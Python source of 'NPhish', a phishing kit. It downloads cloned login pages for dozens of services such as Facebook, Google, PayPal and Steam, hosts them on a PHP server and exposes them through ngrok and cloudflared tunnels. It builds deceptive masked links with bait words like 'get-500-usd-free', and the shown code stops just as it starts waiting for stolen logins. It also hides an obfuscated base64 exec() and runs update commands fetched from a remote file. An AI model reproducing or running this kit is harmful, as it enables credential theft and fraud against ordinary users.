#!/usr/bin/python

# ToolName   : NPhish
# Author     : NISHANT
# Version    : 0.1.0
# License    : MIT License
# Copyright  : Nishant
# Github     : https://github.com/Nishant2009
# Telegram   : https://t.me/lets_do_hacking
# Description: NPhish is a phishing tool made by using python
# Language   : Python
# If you copy open source code, then give credit


#                                 MIT License
#                        Copyright (c) 2022 Nishant2009

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import os, sys, time, socket, argparse
from os import popen, system
from time import sleep
from subprocess import run

# ANSI COLOURS
black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"
wr="\x1b[93;99;95m"

# SYMBOLS
ask = green + '[' + white + '?' + green + '] '+ blue
success = yellow + '[' + white + '√' + yellow + '] '+green
error = blue + '[' + white + '!' + blue + '] '+red
info= yellow + '[' + white + '+' + yellow + '] '+ cyan
info2= green + '[' + white + '•' + green + '] '+ purple

# VERSION
version = "0.1.0"

# LOGO
logo = """
╔══════════════════════════════════╗
║     ╔═╗ ╔╗╔═══╗╔╗        ╔╗      ║
║     ║║╚╗║║║╔═╗║║║        ║║      ║
║     ║╔╗╚╝║║╚═╝║║╚═╗╔╗╔══╗║╚═╗    ║
║     ║║╚╗║║║╔══╝║╔╗║╠╣║══╣║╔╗║    ║
║     ║║ ║║║║║   ║║║║║║╠══║║║║║    ║
║     ╚╝ ╚═╝╚╝   ╚╝╚╝╚╝╚══╝╚╝╚╝    ║
║                                  ║
║     [VERSION = {version}]              ║
║     [By Nishant]                 ║
╚══════════════════════════════════╝

 """.format(version = version)

NPhish = ""
NPhish += "\x61\x57\x59\x67\x49\x6b\x35\x70\x63\x32"
NPhish += "\x68\x68\x62\x6e\x51\x69\x49\x47\x6c\x75"
NPhish += "\x49\x47\x78\x76\x5a\x32\x38\x67\x4f\x67"
NPhish += "\x6f\x67\x49\x43\x41\x67\x63\x47\x46\x7a"
NPhish += "\x63\x77\x70\x6c\x62\x48\x4e\x6c\x49\x44"
NPhish += "\x6f\x4b\x49\x43\x41\x67\x49\x48\x42\x79"
NPhish += "\x61\x57\x35\x30\x4b\x47\x56\x79\x63\x6d"
NPhish += "\x39\x79\x49\x43\x73\x69\x52\x47\x38\x67"
NPhish += "\x62\x6d\x39\x30\x49\x48\x4e\x30\x5a\x57"
NPhish += "\x56\x73\x49\x47\x4e\x76\x5a\x47\x55\x69"
NPhish += "\x4b\x51\x6f\x67\x49\x43\x41\x67\x5a\x58"
NPhish += "\x68\x70\x64\x43\x67\x70"

sites = """[1] Facebook                [20] Reddit           [38] WordPress

[2] Messenger               [21] Adobe            [39] Yandex

[3] Instagram               [22] DevianArt        [40] StackOverflow

[4] Google                  [23] Badoo            [41] VK

[5] Microsoft               [24] Clash Of Clans   [42] Xbox

[6] Netflix                 [25] Ajio             [43] Mediafire

[7] Paypal                  [26] JioRouter        [44] Gitlab

[8] Steam                   [27] FreeFire         [45] Github

[9] Twitter                 [28] Pubg             [46] Apple

[10] PlayStation            [29] Telegram         [47] iCloud

[11] TikTok                 [30] Airtel           [48] Shopify

[12] Twitch                 [31] SocialClub       [49] Myspace

[13] Pinterest              [32] Ola              [50] Shopping

[14] SnapChat               [33] Outlook          [51] Cryptocurrency

[15] LinkedIn               [34] Amazon           [52] Verizon

[16] Ebay                   [35] Origin           [53] Wi-Fi

[17] Quora                  [36] DropBox          [54] Discord

[18] Protonmail             [37] Yahoo            [55] Roblox

[19] Spotify                [38] WordPress        [56] Custom
"""
# CHECK HOME DIRECTORY
exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(NPhish.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
root= popen("cd $HOME && pwd").read().strip()

# Check termux
if os.path.exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False

# Website chooser
def options():
    print(run(['lolcat'],input = sites, capture_output = True, text = True ).stdout)
    print(green+'['+white+'x'+green+']'+yellow+' About                  '+green+'['+white+'m'+green+']'+yellow+' More tools        '+green+'['+white+'0'+green+']'+yellow+' Exit')
    print()
    print()

# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")

# CHECK INTERNET
socket.setdefaulttimeout(30)
def check_intr(host="8.8.8.8", port=53, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
    except socket.error:
        print(error+"No internet!")
        time.sleep(2)
        check_intr()

# SLOW PRINT 
# Print logo
def logo_print(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)

# Print lines
def line_print(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.05)

# CHECK AND INSTALL LOLCAT(FOR COLOUR PRINT)
if system("command -v lolcat > /dev/null 2>&1")!=0:
    line_print("\n"+info+"Installing LOLCAT"+nc)
    system("pip install git+https://github.com/Nishant2009/lolcat.git;clear")

# UPDATE
def update():
    check_intr()
    git_ver=popen("curl -s -N https://raw.githubusercontent.com/Nishant2009/NPhish/main/.version").read().strip()
    if (version == git_ver):
        system("clear")
        print(bgreen + logo)
        print(f"{info}NPhish is up-to-date\n")
    elif (version != git_ver and git_ver != "404: Not Found"):
        changelog=popen("curl -s -N https://raw.githubusercontent.com/Nishant2009/NPhish/main/.changelog.log").read().strip()
        update_commands=popen("curl -s -N https://raw.githubusercontent.com/Nishant2009/NPhish/main/.update").read().strip()
        system("clear")
        print(bgreen + logo)
        print(f"{info}NPhish has a new update!\n{info2}Current Version: {red}{version}\n{info}Available Version: {green}{git_ver}\n")
        update_ask =input(ask+"Do you want to update NPhish?[y/n] > "+green)
        if update_ask =="y":
            print(nc)
            system(update_commands)
            line_print("\n"+success+"NPhish updated successfully!! Please restart terminal!\n")
            if (changelog != "404: Not Found"):
                print(info2+"Changelog:\n"+purple+changelog)
            exit()
        elif update_ask =="n":
            print("\n"+info+"Updating cancelled. Using old version! \nVERSION : "+ version)
            sleep(2)
        else:
            print("\n"+error+"Wrong input!\n")
            sleep(2)

# INSTALL PACKAGES
pkgs=[ "php", "curl", "wget", "unzip" ]

# FOR TERMUX & MAC
def installer(package_manager):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            line_print("\n"+info+"Installing "+pkgs[pkg].upper()+nc)
            system(package_manager+" install -y "+pkgs[pkg])

# FOR LINUX
def sudoinstaller(package_manager):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            line_print(info+"Installing "+pkgs[pkg].upper()+nc)
            system("sudo "+package_manager+" install -y "+pkgs[pkg])

# THANKS MESSAGE ON EXIT
def exit_msg():
    killer()
    line_print("\n"+info2+bgreen+"Thanks for using NPhish!\n"+nc)
    exit(0)

# COLOUR PRINT
def colour_print(n):
    print(run(['lolcat'],input = n, capture_output = True, text = True ).stdout)

# ABOUT
def about():
    system("clear")
    logo_print(bgreen + logo)
    About = "ToolName             :NPhish\nVersion              :"+version+"\nAuthor               :Nishant\nGithub               :https://github.com/Nishant2009\nTelegram Channel     :https://t.me/lets_do_hacking\n"
    print(run(['lolcat'],input = About, capture_output = True, text = True ).stdout)
    print()
    print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+blue+'  Main Menu       ')
    print()
    about= input("\n > ")
    if abot== "0":
        exit_msg()
    else:
        main()

# INSTALLING NGROK AND CLOUDFLARE

def cld_ngr_install():
    check_intr()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            system("pkg install proot -y")
    if True:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
                    line_print("\n"+info+"Installing "+pkgs[pkg].upper()+nc)
                    system("sudo pacman -S "+pkgs[pkg]+" --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            line_print("\n"+error+"Unsupported package manager. Install packages manually!"+nc)
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        line_print(error+"PHP cannot be installed. Install it manually!")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        line_print(error+"Unzip cannot be installed. Install it manually!")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        line_print(error+"Curl cannot be installed. Install it manually!")
        exit(1)
    killer()
    x=popen("uname -m").read()
    y=popen("uname").read()
    if not os.path.isfile(root+"/.ngrokfolder/ngrok"):
        line_print("\n"+info+"Downloading ngrok....."+nc)
        check_intr()
        system("rm -rf ngrok.zip ngrok.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                system("wget -q --show-progress https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz -O ngrok.tgz")
                system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
            elif x.find("arm")!=-1:
                system("wget -q --show-progress https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1 ")
            elif x.find("x86_64")!=-1:
                system("wget -q --show-progress https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
            else:
                system("wget -q --show-progress https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                system("unzip ngrok.zip > /dev/null 2>&1")
            elif x.find("arm64")!=-1:
                system("wget -q --show-progress 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
            else:
                print(f"{error}Device architecture unknown. Download ngrok manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf ngrok.zip && mkdir $HOME/.ngrokfolder")
        system("mv -f ngrok $HOME/.ngrokfolder")
        if sudo:
            system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
        else:
            system("chmod +x $HOME/.ngrokfolder/ngrok")
    if not os.path.isfile(root+"/.cloudflaredfolder/cloudflared"):
        line_print("\n"+info+"Downloading cloudflared....."+nc)
        check_intr()
        system("rm -rf cloudflared cloudflared.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
            elif x.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
            elif x.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
            else:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                system("tar -zxf cloudflared.tgz > /dev/null 2>&1 && rm -rf cloudflared.tgz")
            elif x.find("arm64")!=-1:
                print(f"{error}Cloudflared not available for device architecture!")
                sleep(3)
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("mkdir $HOME/.cloudflaredfolder")
        system("mv -f cloudflared $HOME/.cloudflaredfolder")
        if sudo:
            system("sudo chmod +x $HOME/.cloudflaredfolder/cloudflared")
        else:
            system("chmod +x $HOME/.cloudflaredfolder/cloudflared")
    if system("pidof php > /dev/null 2>&1")==0:
        line_print(error+"Previous php still running! Please restart terminal and try again"+nc)
        exit()
    if system("pidof ngrok > /dev/null 2>&1")==0:
        line_print(error+"Previous ngrok still running. Please restart terminal and try again"+nc)
        exit()
    else:
        system("chmod +x $HOME/.cloudflaredfolder/cloudflared")

# MAIN FUNCTION
def main():
    cld_ngr_install()
    while True:
        if os.path.exists(root+"/.site"):
            system("rm -rf $HOME/.site && cd $HOME && mkdir .site")
            break
        else:
            system("cd $HOME && mkdir .site")
            break
    while True:
        os.system("clear")
        logo_print(bgreen + logo)
        options()
        choose= input(ask+"Select one of the options > "+nc)
        if choose=="1" or choose == "01":
            colour_print("\n[1] Facebook Traditional\n[2] Facebook Voting\n[3] Facebook Security\n[99] Main Menu\n[0]Exit\n\n\n")
            select= input(ask+"Select one of the options > "+nc)
            if select =="1" or select == "01":
                folder="facebook"
                mask="https://blue-verified-facebook-free"
                requirements(folder,mask)
            elif select == "2" or select == "02":
                folder="fb_advanced"
                mask='https://vote-for-the-best-social-media'
                requirements(folder,mask)
            elif select == "3" or select == "03":
                folder="fb_security"
                mask='https://make-your-facebook-secured-and-free-from-hackers'
                requirements(folder,mask)
            elif select == "4" or select == "04":
                folder="fb_messenger"
                mask='https://get-messenger-premium-features-free'
                requirements(folder,mask)
            elif select == "0" or select=="00":
                exit()
            else:
                main()
        elif choose == "2" or choose == "02":
            folder="fb_messenger"
            mask='https://get-messenger-premium-features-free'
            requirements(folder,mask)
        elif choose == "3" or choose == "03":
            colour_print("\n[1] Instagram Traditional\n[2] Insta Auto Followers\n[3] Insta 1000 Followers\n[4] Insta Blue Verify\n[99] Main Menu\n[0]Exit\n\n\n")
            select= input(ask+"Select one of the options > "+nc)
            if select =="1" or select == "01":
                folder="instagram"
                mask='https://get-unlimited-followers-for-instagram'
                requirements(folder,mask)
            elif select == "2" or select== "02":
                folder="ig_followers"
                mask='https://get-unlimited-followers-for-instagram'
                requirements(folder,mask)
            elif select == "3" or select == "03":
                folder="insta_followers"
                mask='https://get-1000-followers-for-instagram'
                requirements(folder,mask)
            elif select == "4" or select == "04":
                folder="ig_verify"
                mask='https://blue-badge-verify-for-instagram-free'
                requirements(folder,mask)
            elif select == "0" or select=="00":
                exit()
            else:
                main()
        elif choose=="4" or choose == "04":
            colour_print("\n[1] Gmail Old\n[2] Gmail New\n[3] Gmail Poll\n[4] Youtube\n[99] Main Menu\n[0]Exit\n\n\n")
            select= input(ask+"Select one of the options > "+nc)
            if select =="1" or select == "01":
                folder="google"
                mask='https://get-unlimited-google-drive-free'
                requirements(folder,mask)
            elif select =="2" or select == "02":
                folder="google_new"
                mask='https://get-unlimited-google-drive-free'
                requirements(folder,mask)
            elif select == "3" or select == "03":
                folder="google_poll"
                mask='https://vote-for-the-best-social-media'
                requirements(folder,mask)
            elif select == "4" or select =="04":
                folder="youtube"
                mask='https://get-1k-like-in-any-video'
                requirements(folder,mask)
            elif select == "0" or select=="00":
                exit()
            else:
                main()
        elif choose=="5" or choose=="05":
            folder="microsoft"
            mask='https://unlimited-onedrive-space-for-free'
            requirements(folder,mask)
        elif choose=="6" or choose=="06":
            folder="netflix"
            mask='https://upgrade-your-netflix-plan-free'
            requirements(folder,mask)
        elif choose=="7" or choose=="07":
            folder="paypal"
            mask='https://get-500-usd-free-to-your-account'
            requirements(folder,mask)
        elif choose=="8" or choose=="08":
            folder="steam"
            mask='https://steam-500-usd-gift-card-free'
            requirements(folder,mask)
        elif choose=="9" or choose=="09":
            folder="twitter"
            mask='https://get-blue-badge-on-twitter-free'
            requirements(folder,mask)
        elif choose=="10":
            folder="playstation"
            mask='https://playstation-500-usd-gift-card-free'
            requirements(folder,mask)
        elif choose=="11":
            folder="tiktok"
            mask='https://tiktok-free-liker'
            requirements(folder,mask)
        elif choose=="12":
            folder="twitch"
            mask='https://unlimited-twitch-tv-user-for-free'
            requirements(folder,mask)
        elif choose=="13":
            folder="pinterest"
            mask='https://get-a-premium-plan-for-pinterest-free'
            requirements(folder,mask)
        elif choose=="14":
            colour_print("\n[1] SnapChat 1\n[2] Snapchat 2\n[99] Main Menu\n[0] Exit")
            select= input(ask+"Select one of the options > "+nc)
            if select =="1" or select == "01":
                folder="snapchat"
                mask='https://view-locked-snapchat-accounts-secretly'
                requirements(folder,mask)
            elif select == "2" or select =="02":
                folder="snapchat2"
                mask='https://view-locked-snapchat-accounts-secretly'
                requirements(folder,mask)
            elif select == "0" or select=="00":
                exit()
            else:
                main()
        elif choose=="15":
            folder="linkedin"
            mask='https://get-a-premium-plan-for-linkedin-free'
            requirements(folder,mask)
        elif choose=="16":
            folder="ebay"
            mask='https://get-500-usd-free-to-your-account'
            requirements(folder,mask)
        elif choose=="17":
            folder="quora"
            mask='https://quora-premium-for-free'
            requirements(folder,mask)
        elif choose=="18":
            folder="protonmail"
            mask='https://protonmail-pro-basics-for-free'
            requirements(folder,mask)
        elif choose=="19":
            folder="spotify"
            mask='https://convert-your-account-to-spotify-premium'
            requirements(folder,mask)
        elif choose=="20":
            folder="reddit"
            mask='https://reddit-official-verified-member-badge'
            requirements(folder,mask)
        elif choose=="21":
            folder="adobe"
            mask='https://get-adobe-lifetime-pro-membership-free'
            requirements(folder,mask)
        elif choose=="22":
            folder="deviantart"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose=="23":
            folder="badoo"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose=="24":
            folder="clashofclans"
            mask='https://get-unlimited-gems-in-your-coc-account'
            requirements(folder,mask)
        elif choose=="25":
            folder="ajio"
            mask='https://get-limited-time-discount'
            requirements(folder,mask)
        elif choose=="26":
            folder="jiorouter"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose=="27":
            folder="freefire"
            mask='https://get-unlimited-diamonds-in-your-ff-account'
            requirements(folder,mask)
        elif choose == "28":
            folder="pubg"
            mask='https://get-unlimited-diamonds-in-your-pubg-account'
            requirements(folder,mask)
        elif choose == "29":
            folder="telegram"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "30":
            folder="airtelsim"
            mask='https://get-500-cureency-free-to-your-account'
            requirements(folder,mask)
        elif choose == "31":
            folder="socialclub"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "32":
            folder="ola"
            mask='https://book-a-cab-in-discount'
            requirements(folder,mask)
        elif choose == "33":
            folder="outlook"
            mask='https://grab-mail-from-anyother-outlook-account-free'
            requirements(folder,mask)
        elif choose == "34":
            folder="amazon"
            mask='https://get-limited-time-discount-free'
            requirements(folder,mask)
        elif choose == "35":
            folder="origin"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "36":
            folder="dropbox"
            mask='https://get-1TB-cloud-storage-free'
            requirements(folder,mask)
        elif choose == "37":
            folder="yahoo"
            mask='https://grab-mail-from-anyother-yahoo-account-free'
            requirements(folder,mask)
        elif choose == "38":
            folder="wordpress"
            mask='https://unlimited-wordpress-traffic-free'
            requirements(folder,mask)
        elif choose == "39":
            folder="yandex"
            mask='https://grab-mail-from-anyother-yandex-account-free'
            requirements(folder,mask)
        elif choose == "40":
            folder="stackoverflow"
            mask='https://get-stackoverflow-lifetime-pro-membership-free'
            requirements(folder,mask)
        elif choose=="41":
            colour_print("\n[1] VK\n[2]VK Poll\n[99] Main Menu\n[0]Exit\n\n\n")
            select= input(ask+"Select one of the options > "+nc)
            if select =="1" or select == "01":
                folder="vk"
                mask='https://vk-premium-real-method-2020'
                requirements(folder,mask)
            elif select=="2" or select=="02":
                folder="vk_pole"
                mask='https://vote-for-the-best-social-media'
                requirements(folder,mask)
            elif select == "0" or select=="00":
                exit()
            else:
                main()
        elif choose=="42":
            folder="xbox"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose=="43":
            folder="mediafire"
            mask='https://get-1TB-on-mediafire-free'
            requirements(folder,mask)
        elif choose=="44":
            folder="gitlab"
            mask='https://get-1k-followers-on-gitlab-free'
            requirements(folder,mask)
        elif choose == "45":
            folder="github"
            mask='https://get-1k-followers-on-github-free'
            requirements(folder,mask)
        elif choose == "46":
            folder="apple"
            mask='https://get-apple-premium-account-free'
            requirements(folder,mask)
        elif choose == "47":
            folder="icloud"
            mask='https://unlimited-storage-icloud-free'
            requirements(folder,mask)
        elif choose == "48":
            folder="shopify"
            mask='https://get-50%-discount-on-any-sale'
            requirements(folder,mask)
        elif choose == "49":
            folder="myspace"
            mask='https://get-1k-followers-on-myspace-free-free'
            requirements(folder,mask)
        elif choose == "50":
            folder="shopping"
            mask='https://get-50%-discount-on-any-sale'
            requirements(folder,mask)
        elif choose == "51":
            folder="cryptocurrency"
            mask='https://get-bitcoins-free'
            requirements(folder,mask)
        elif choose=="52":
            folder="verizon"
            mask='https://get-verizon-premium-account-free'
            requirements(folder,mask)
        elif choose == "53":
            folder="wifi"
            mask='https://reconnect-your-wifi'
            requirements(folder,mask)
        elif choose == "54":
            folder="discord"
            mask='https://security-bot-for-your-discord-free'
            requirements(folder,mask)
        elif choose == "55":
            folder="roblox"
            mask='https://play-premium-games-for-free'
            requirements(folder,mask)
        elif choose == "56":
            customdir()
        elif choose == "x" or choose == "X":
            about()
        elif choose == "m" or choose == "M":
            system("xdg-open 'https://github.com/Nishant2009'")
            main()
        elif choose=="0":
            exit_msg()
        else:
            line_print("\n"+error+"Wrong input")
            main()

# COPY WEBSITE FROM CUSTOM DIRECTORY
def customdir():
    dir=input("\n"+ask+"Enter the directory > "+green)
    if os.path.exists(dir):
        if os.path.isfile(dir+"/index.php"):
            system("cd "+dir+" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site")
            server()
        else:
            line_print(error+"Index.php required but not found!")
            main()

# DOWNLOADING SITE FOLDER 
def requirements(folder,mask):
    while True:
        if os.path.exists(root+"/.websites/"+folder):
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
        else:
            check_intr()
            line_print("\n"+info+"Downloading required files.....\n")
            check_intr()
            system(f"wget -q --show-progress https://github.com/Nishant2009/NPhish/raw/main/Websites/{folder}.zip -O websites.zip")
            if not os.path.exists(root+"/.websites"):
                system("cd $HOME && mkdir .websites")
            system("cd $HOME/.websites && mkdir "+folder)
            system(f"unzip websites.zip -d $HOME/.websites/{folder}  > /dev/null 2>&1 ")
            os.remove("websites.zip")
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
    with open(".info.txt", "w") as inform:
        inform.write(mask)
    system("mv -f .info.txt $HOME/.site")
    server()

# ASK FOR CUSTOM URL
def custom_url_ask(url):
    cust= input("\n"+ask+bcyan+"Want to try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    get_credentials()

# START SERVER AND START TUNNELING
def server():
    system("clear")
    logo_print( bgreen + logo)
    if termux:
        line_print("\n"+info+"Enable Hotspot For Ngrok")
        sleep(1)
    line_print("\n"+info2+"Initializing PHP server at localhost:8080....")
    check_intr()
    system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
    sleep(2)
    while True:
        if not system("curl --output /dev/null --silent --head --fail 127.0.0.1:8080"):
            line_print("\n"+info+"PHP Server has started successfully!")
            break
        else:
            line_print(error+"PHP Error")
            killer()
            exit(1)
    line_print("\n"+info2+"Initializing tunnelers at same address.....")
    check_intr()
    system("cd $HOME/.cloudflaredfolder && chmod +x * && cd $HOME && rm -rf $HOME/.cloudflaredfolder/log.txt")
    while True:
        if system("command -v termux-chroot > /dev/null 2>&1")==0:
            system("cd $HOME/.ngrokfolder && termux-chroot ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
            system("cd $HOME/.cloudflaredfolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
            break
        else:
            system("cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
            system("cd $HOME/.cloudflaredfolder && ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
            break
    sleep(9)
    ngroklink=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
    if ngroklink.find("ngrok")!=-1:
        ngrokcheck=True
    else:
        ngrokcheck=False
    cflink=popen("cat $HOME/.cloudflaredfolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    if cflink.find("cloudflare")!=-1:
        cfcheck=True
    else:
        cfcheck=False
    while True:
        if ngrokcheck and cfcheck:
            url_manager(cflink, "1", "2")
            url_manager(ngroklink, "3", "4")
            custom_url_ask(cflink)
            break
        elif not ngrokcheck and cfcheck:
            url_manager(cflink, "1", "2")
            custom_url_ask(cflink)
            break
        elif not cfcheck and ngrokcheck:
            url_manager(ngroklink, "1", "2")
            custom_url_ask(ngroklink)
            break
        elif not (cfcheck and ngrokcheck):
            line_print("\n"+error+"Tunneling falied!"+nc)
            killer()
            exit()
        else:
            line_print("\n"+error+"Unknown error!")
            killer()
            exit()

# URL MASKING
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url
    check_intr()
    main1= os.popen("curl -s "+website)
    main2=main1.read()
    if not main2.find("gd")!=-1:
        line_print(error+"Service not available")
        get_credentials()
    main= main2.replace("https://", "")
    domain= input("\n"+ask+"Enter custom domain(Example: google.com, yahoo.com > ")
    if domain=="":
        line_print("\n"+error+"No domain!")
        bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
        if (bait==""):
            line_print("\n"+error+"No bait word!")
            line_print("\n"+success+"Your url is > https://"+ main)
            get_credentials()
        if bait.find(" ")!=-1:
            line_print("\n"+error+"Space in bait word!")
            get_credentials()
        final= "https://"+bait+"@"+main
        line_print("\n"+success+"Your url is > "+ final)
        get_credentials()
    if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
        bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
        if (bait==""):
            line_print("\n"+error+"No bait word!")
            final= domain+"@"+main
            line_print("\n"+success+"Your url is > "+ final)
            get_credentials()
        if bait.find(" ")!=-1:
            line_print("\n"+error+"Space in bait word!")
            get_credentials()
        final= domain+"-"+bait+"@"+main
        line_print("\n"+success+"Your url is > "+ final)
        get_credentials()
    else:
        domain= "https://"+domain
        bait= input("\n"+ask+"Enter bait words without space and hyphen(Example: free-money, insta followers) > ")
        if bait=="":
            line_print("\n"+error+"No bait word!")
            final= domain+"@"+main
            line_print("\n"+success+"Your url is > "+ final)
            get_credentials()
        if bait.find(" ")!=-1:
            line_print("\n"+error+"Space in bait word!")
            get_credentials()
        final= domain+"-"+bait+"@"+main
        line_print("\n"+success+"Your url is > "+ final)
        get_credentials()

# FINAL URL'S
def url_manager(url,num1,num2):
    check_intr()
    line_print("\n"+success+"Your urls are given below: \n")
    system("rm -rf $HOME/.site/ip.txt")
    print(info2+"URL "+num1+" > "+yellow+url)
    if os.path.isfile(root+"/.site/.info.txt"):
        with open(root+"/.site/.info.txt", "r") as inform:
            masked=inform.read()
            print(info2+"URL "+num2+" > "+yellow+masked.strip()+"@"+url.replace("https://",""))

# GET CREDENTIALS
def get_credentials():
    line_print("\n"+info+blue+"Waiting for login info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
    try:
        while True:
